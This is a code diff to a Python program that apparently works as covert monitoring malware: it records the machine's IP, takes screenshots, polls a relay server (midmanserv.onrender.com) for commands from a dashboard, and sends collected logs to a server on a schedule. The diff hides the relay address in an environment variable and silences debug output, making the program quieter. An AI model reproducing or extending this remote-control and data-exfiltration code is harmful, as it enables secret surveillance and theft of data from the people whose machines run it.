@@ -33,7 +33,7 @@ try:
 except:
     my_ip = "Unknown"
     pass
-midman = f"https://midmanserv.onrender.com/api/{my_ip}"
+midman = os.getenv("midman_url")
 
 ##
 def set_scheduler():
@@ -106,11 +106,11 @@ def take_screenshot():
 #Listen for ss commands from dashb
 def command_listener():
     while True:
-        print(f"Listening for commands at {midman}...")
+        #print(f"Listening for commands at {midman}...")
         try:
             response = requests.get(f"{midman}/{user}", stream=True)
             for line in response.iter_lines():
-                print(f"Received line: {line}")  # Debug print to see raw lines
+                #print(f"Received line: {line}")  # Debug print to see raw lines
                 if line:
                     decoded_line = line.decode('utf-8')
                     if decoded_line.startswith("data: "):
@@ -138,7 +138,7 @@ def command_listener():
         except requests.exceptions.RequestException:
             time.sleep(5)
         except Exception as e:
-            print(f"Error: {e}")
+            #print(f"Error: {e}")
             time.sleep(5)
 
 #listener code
@@ -200,7 +200,7 @@ def send_logs_to_server():
                 save_to_file(data_to_send)
 
     except Exception as e:
-        print(f"Error sending to server: {e}") #remove after testing
+        #print(f"Error sending to server: {e}") #remove after testing
         pass
 
 # schedule next sync in 60 seconds
